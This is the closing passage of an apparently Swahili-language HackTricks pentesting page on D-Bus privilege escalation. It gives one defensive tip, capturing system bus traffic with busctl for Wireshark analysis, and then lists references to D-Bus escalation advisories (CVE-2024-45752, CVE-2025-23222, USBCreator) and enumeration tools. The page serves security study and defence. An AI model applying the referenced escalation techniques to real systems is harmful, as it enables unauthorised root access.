* Blue-team: rekodi system bus kwa `busctl capture > /var/log/dbus_$(date +%F).pcapng` na uiingize kwenye Wireshark ili kugundua anomalies.

---

## References

- [1] [Kuongezeka kwa Privilege kupitia USBCreator D-Bus katika Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: Service ya D-Bus inaruhusu mtumiaji yeyote asiye na privileges kufanya usanidi](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Bypass ya Authentication katika Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap ya D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - Nyaraka za D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
